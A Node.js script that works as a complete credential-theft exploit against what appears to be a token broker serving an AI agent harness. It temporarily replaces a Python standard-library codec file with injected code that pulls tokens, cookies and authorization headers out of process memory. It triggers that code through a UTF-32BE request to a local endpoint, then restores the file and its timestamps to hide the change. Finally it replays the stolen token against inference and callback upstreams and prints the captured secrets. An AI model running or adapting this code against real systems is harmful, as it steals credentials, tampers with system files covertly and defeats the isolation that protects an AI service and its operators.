const fs = require("node:fs");
const http = require("node:http");
const https = require("node:https");

const capturePath = "/tmp/gflb-broker-credentials.json";
const sourcePath = "/usr/local/lib/python3.13/encodings/utf_32_be.py";
const pycPath = "/usr/local/lib/python3.13/encodings/__pycache__/utf_32_be.cpython-313.pyc";
try { fs.unlinkSync(capturePath); } catch {}

function encodeUtf32BE(text) {
  const bytes = Buffer.alloc(text.length * 4);
  for (let index = 0; index < text.length; index += 1) bytes.writeUInt32BE(text.codePointAt(index), index * 4);
  return bytes;
}

function trigger(body) {
  return new Promise((resolve, reject) => {
    const req = http.request({ hostname: "127.0.0.1", port: 8080, path: "/invocations", method: "POST", headers: { "Content-Type": "application/json", "Content-Length": body.length }, timeout: 15000 }, (res) => {
      const chunks = [];
      res.on("data", (chunk) => chunks.push(chunk));
      res.on("end", () => resolve({ status: res.statusCode, body: Buffer.concat(chunks).toString("utf8") }));
    });
    req.on("timeout", () => req.destroy(new Error("timeout")));
    req.on("error", reject);
    req.end(body);
  });
}

function directRequest(url, method, headers, body, timeout = 30000) {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const requestHeaders = { ...headers, "Content-Length": body.length };
    const req = https.request({ hostname: parsed.hostname, port: parsed.port || 443, path: parsed.pathname + parsed.search, method, headers: requestHeaders, timeout }, (res) => {
      const chunks = [];
      res.on("data", (chunk) => chunks.push(chunk));
      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks).toString("utf8") }));
    });
    req.on("timeout", () => req.destroy(new Error("timeout")));
    req.on("error", reject);
    req.end(body);
  });
}

async function main() {
  const original = fs.readFileSync(sourcePath);
  const stat = fs.statSync(sourcePath);
  let pyc = null;
  let pycStat = null;
  try { pyc = fs.readFileSync(pycPath); pycStat = fs.statSync(pycPath); } catch {}
  const injected = `# coding: utf-8\nimport gc as _g, json as _j\nfor _o in _g.get_objects():\n    if type(_o).__name__ == "TokenBroker" and hasattr(_o, "_token"):\n        _d = {"conversation_token": _o._token, "ldso_cookie": _o._ldso_cookie, "git_authorization": _o._git_authorization, "gonfalon_authorization": _o._gonfalon_authorization, "upstreams": _o._upstreams}\n        open(${JSON.stringify(capturePath)}, "w", encoding="utf-8").write(_j.dumps(_d, sort_keys=True))\n        break\nexec(compile(__import__("base64").b64decode(${JSON.stringify(original.toString("base64"))}), __file__, "exec"))\n`;
  fs.writeFileSync(sourcePath, injected, { mode: stat.mode & 0o7777 });
  let response;
  try {
    response = await trigger(encodeUtf32BE("{}"));
  } finally {
    fs.writeFileSync(sourcePath, original, { mode: stat.mode & 0o7777 });
    fs.utimesSync(sourcePath, stat.atime, stat.mtime);
    if (pyc !== null) {
      fs.writeFileSync(pycPath, pyc, { mode: pycStat.mode & 0o7777 });
      fs.utimesSync(pycPath, pycStat.atime, pycStat.mtime);
    } else { try { fs.unlinkSync(pycPath); } catch {} }
  }
  const captured = fs.readFileSync(capturePath, "utf8");
  const credentials = JSON.parse(captured);
  const token = credentials.conversation_token;
  const wrongToken = token.slice(0, -1) + (token.endsWith("A") ? "B" : "A");
  const callbackBody = Buffer.from("{}");
  const callbackHeaders = (value) => ({ "Content-Type": "application/json", Authorization: `Bearer ${value}` });
  const callbackCorrect = await directRequest(`${credentials.upstreams.callbacks}/messages`, "POST", callbackHeaders(token), callbackBody);
  const callbackWrong = await directRequest(`${credentials.upstreams.callbacks}/messages`, "POST", callbackHeaders(wrongToken), callbackBody);
  const inferenceHeaders = (value) => ({ "Content-Type": "application/json", Accept: "application/json", "anthropic-version": "2023-06-01", Authorization: `Bearer ${value}` });
  const inferenceCorrect = await directRequest(`${credentials.upstreams.inference}/v1/messages`, "POST", inferenceHeaders(token), callbackBody);
  const inferenceWrong = await directRequest(`${credentials.upstreams.inference}/v1/messages`, "POST", inferenceHeaders(wrongToken), callbackBody);
  console.log(`BROKER_TRIGGER_RESPONSE=${JSON.stringify(response)}`);
  console.log(`BROKER_CREDENTIAL_CAPTURE=${captured}`);
  console.log(`CALLBACK_TOKEN_CORRECT=${JSON.stringify(callbackCorrect)}`);
  console.log(`CALLBACK_TOKEN_WRONG=${JSON.stringify(callbackWrong)}`);
  console.log(`INFERENCE_TOKEN_CORRECT=${JSON.stringify(inferenceCorrect)}`);
  console.log(`INFERENCE_TOKEN_WRONG=${JSON.stringify(inferenceWrong)}`);
  console.log("BROKER_CREDENTIAL_DIRECT_USE_COMPLETE=true");
}

main().catch((error) => { console.error(error.stack || String(error)); process.exit(1); });
